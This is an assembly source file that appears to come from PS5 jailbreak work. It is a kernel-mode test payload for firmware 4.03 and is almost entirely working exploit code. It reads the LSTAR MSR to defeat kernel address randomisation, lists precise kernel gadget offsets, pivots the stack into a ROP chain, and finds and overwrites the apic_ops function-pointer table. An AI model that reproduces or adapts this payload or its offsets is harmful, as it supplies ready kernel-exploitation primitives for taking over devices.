/*
 * rop_test.S — ROP chain test payload for PS5 FW 4.03
 *
 * Runs as a kernel thread via kldload.elf's kproc_create.
 * Entry: RDI = pointer to 512-byte kthread_args buffer (readable from userspace)
 *
 * This payload tests the full ROP chain mechanism:
 *   1. Resolves ktext gadget addresses from kdata_base
 *   2. Builds a ROP chain in the kthread_args buffer
 *   3. Pivots RSP to the chain (using a kdata gadget during normal ops)
 *   4. Chain executes: sets RAX=1 via ktext nop_ret, writes proof marker
 *   5. Returns to our code which writes results back
 *
 * kstuff FW 4.03 offsets (relative to kdata_base, negative = ktext):
 *   nop_ret          = kdata + (-0x9d20ca) = wrmsr_ret + 2
 *   wrmsr_ret        = kdata + (-0x9d20cc)
 *   doreti_iret      = kdata + (-0x9cf84c)
 *   pop_all_iret     = kdata + (-0x9cf8ab)
 *   push_pop_all_iret= kdata + (-0x96be70)
 *   justreturn       = kdata + (-0x9cf990)
 *   rdmsr_start      = kdata + (-0x9d0cfa)
 *   rep_movsb_pop_rbp_ret = kdata + (-0x99002a)
 *   mov_cr3_rax      = kdata + (-0x396f9e)
 *   copyin           = kdata + (-0x9908e0)
 *   copyout          = kdata + (-0x990990)
 *   malloc           = kdata + (-0xa9b00)
 *   sysents          = kdata + 0x1709c0
 *
 * apic_ops is at approximately kdata + 0x1656b0 (varies slightly)
 * but we scan for it dynamically.
 */

.intel_syntax noprefix
.text
.globl _start
_start:
    /* RDI = kthread_args buffer pointer (our output + scratch space) */
    push rbx
    push rbp
    push r12
    push r13
    push r14
    push r15
    mov r12, rdi            /* r12 = output buffer */

    /* ---- Step 0: Read kdata_base from MSR ---- */
    /* Read GS base (MSR 0xC0000101) — on PS5 this is PCPU pointer */
    /* Actually, the caller puts kdata_base in args. But for a flat binary */
    /* running as kthread, we compute it from LSTAR (MSR 0xC0000082). */
    /* LSTAR = ktext_base + 0x294218 (confirmed from apic_ops dump). */
    /* ktext_base = kdata_base - 0xC00000 (confirmed from multiple sessions). */
    /* So kdata_base = LSTAR - 0x294218 + 0xC00000 = LSTAR + 0x96BDE8. */
    mov ecx, 0xC0000082     /* MSR_LSTAR */
    rdmsr
    shl rdx, 32
    or rax, rdx
    mov r13, rax            /* r13 = LSTAR */

    /* Compute kdata_base */
    /* kdata_base = LSTAR - 0x294218 + 0xC00000 */
    mov r14, rax
    sub r14, 0x294218
    add r14, 0xC00000       /* r14 = kdata_base */

    /* Compute ktext_base */
    mov r15, r14
    sub r15, 0xC00000       /* r15 = ktext_base */

    /* Store basics in output buffer */
    mov rax, 0x524F5054455354  /* "ROPTEST" magic */
    mov [r12+0x00], rax
    mov [r12+0x08], r14     /* kdata_base */
    mov [r12+0x10], r15     /* ktext_base */
    mov [r12+0x18], r13     /* LSTAR */

    /* ---- Step 1: Compute gadget addresses ---- */
    /* nop_ret = kdata_base + (-0x9d20ca) */
    lea rbx, [r14 - 0x9d20ca]  /* rbx = nop_ret (also: ret instruction) */
    mov [r12+0x20], rbx     /* store nop_ret addr */

    /* ---- Step 2: Test 1 — Direct call to nop_ret ---- */
    /* nop_ret is "nop; ret" in ktext. Calling it should return cleanly. */
    call rbx
    /* If we get here, nop_ret worked */
    mov byte ptr [r12+0x28], 0x01   /* test1 = PASS */

    /* ---- Step 3: Test 2 — RSP pivot + ROP chain ---- */
    /* Build a minimal ROP chain in the output buffer at offset 0x100 */
    /* Chain layout (each entry is 8 bytes = one return address): */
    /*   [0x100] = addr of nop_ret (nop; ret — does nothing, chains to next) */
    /*   [0x108] = addr of nop_ret (second nop; ret — proves chaining works) */
    /*   [0x110] = addr of "return_from_rop" (our code, in kdata — NX cleared) */

    /* But wait — we can't put our code address in the chain during suspend */
    /* because kdata is NX. For THIS test (normal ops), kdata IS executable */
    /* (NX cleared by kldload). So this tests the chain mechanics. */

    /* For the suspend test, the entire chain would use ktext gadgets only, */
    /* and the final "return" would go to a ktext gadget that sets RAX=1. */

    /* Compute return address — we need the address of return_from_rop. */
    /* Since this is position-independent code loaded at exec_code address, */
    /* we use RIP-relative addressing. */
    lea rax, [rip + return_from_rop]
    mov [r12+0x100], rbx    /* chain[0] = nop_ret */
    mov [r12+0x108], rbx    /* chain[1] = nop_ret */
    mov [r12+0x110], rax    /* chain[2] = return_from_rop (our code) */

    /* Now pivot RSP to the chain. */
    /* Save original RSP so we can restore it. */
    mov [r12+0x0F0], rsp    /* save original RSP at offset 0xF0 */
    mov [r12+0x0F8], rbp    /* save original RBP at offset 0xF8 */

    /* PIVOT: set RSP to point to chain[0] */
    lea rsp, [r12+0x100]

    /* Execute the chain by returning into it */
    ret                     /* pops chain[0] = nop_ret, jumps there */
    /* nop_ret does: nop; ret → pops chain[1] = nop_ret, jumps there */
    /* nop_ret does: nop; ret → pops chain[2] = return_from_rop, jumps there */

return_from_rop:
    /* If we get here, the ROP chain worked! */
    /* Restore RSP/RBP from saved values */
    mov rsp, [r12+0x0F0]
    mov rbp, [r12+0x0F8]
    mov byte ptr [r12+0x29], 0x01   /* test2 = PASS */

    /* ---- Step 4: Test 3 — apic_ops[2] read/write ---- */
    /* Find apic_ops in kdata. It's a table of function pointers, all pointing */
    /* into ktext. On FW 4.03, it's at approximately kdata+0x1656b0 or */
    /* kdata+0x5D4AC8 depending on KASLR. We scan for it. */
    /*
     * Scan strategy: apic_ops[2] = xapic_mode, which is ktext+0x294340.
     * We know ktext_base (r15), so xapic_mode = r15 + 0x294340.
     * Scan kdata for a pointer matching this value at offset +16 (slot 2).
     */
    mov rax, r15
    add rax, 0x294340       /* rax = expected xapic_mode address */
    mov [r12+0x30], rax     /* store expected xapic_mode for verification */

    /* Scan kdata from +0x100000 to +0x600000 in 8-byte steps */
    /* looking for our expected xapic_mode at slot[2] (offset +16) */
    lea rbx, [r14 + 0x100000]   /* scan start */
    lea rcx, [r14 + 0x600000]   /* scan end */

.scan_loop:
    cmp rbx, rcx
    jge .scan_failed
    cmp qword ptr [rbx + 16], rax   /* check slot[2] */
    je .scan_found
    add rbx, 8
    jmp .scan_loop

.scan_found:
    /* rbx = apic_ops base address */
    mov [r12+0x38], rbx     /* store apic_ops address */

    /* Read current apic_ops[2] */
    mov rax, [rbx + 16]
    mov [r12+0x40], rax     /* original apic_ops[2] */

    /* Write test pattern */
    mov rax, 0xdeadc0de00c0ffee
    mov [rbx + 16], rax

    /* Read back */
    mov rax, [rbx + 16]
    mov [r12+0x48], rax     /* readback (should be our pattern) */

    /* Restore original */
    mov rax, [r12+0x40]
    mov [rbx + 16], rax

    /* Verify */
    mov rcx, 0xdeadc0de00c0ffee
    cmp [r12+0x48], rcx
    jne .apic_fail
    mov byte ptr [r12+0x50], 0x01   /* test3 = PASS */
    jmp .done

.scan_failed:
    mov rax, 0xFFFFFFFFFFFFFFFF  /* scan failed marker */
    mov [r12+0x38], rax
    mov byte ptr [r12+0x50], 0x00   /* test3 = FAIL */
    jmp .done

.apic_fail:
    mov byte ptr [r12+0x50], 0x02   /* test3 = FAIL (write/readback mismatch) */

.done:
    /* ---- Results Summary ---- */
    /* Output buffer layout:
     *   [0x00] = "ROPTEST" magic (0x524F5054455354)
     *   [0x08] = kdata_base
     *   [0x10] = ktext_base
     *   [0x18] = LSTAR
     *   [0x20] = nop_ret address
     *   [0x28] = test results: byte[0]=test1, byte[1]=test2
     *   [0x30] = expected xapic_mode
     *   [0x38] = apic_ops address (or 0xFFFF... if not found)
     *   [0x40] = original apic_ops[2]
     *   [0x48] = apic_ops[2] readback after write
     *   [0x50] = test3 result
     */

    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rbx
    ret
